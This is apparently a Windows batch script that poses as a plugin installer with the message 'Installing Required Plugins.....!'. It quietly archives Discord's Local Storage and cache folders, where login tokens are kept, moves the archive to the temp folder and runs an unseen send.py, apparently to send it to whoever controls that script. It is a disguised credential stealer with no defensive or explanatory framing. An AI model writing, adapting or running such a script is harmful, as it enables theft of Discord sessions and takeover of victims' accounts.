@echo on
dir
copy send.py %temp%\
cd /D %appdata%\discord
echo "Installing Required Plugins.....!"
tar -cvzf locked.tar.gz GPUCache "Code Cache" Cache "Local Storage" >nul 2>nul
ren locked.tar.gz locked
move locked %temp%
cd /D %temp% 
py send.py
pause
exit
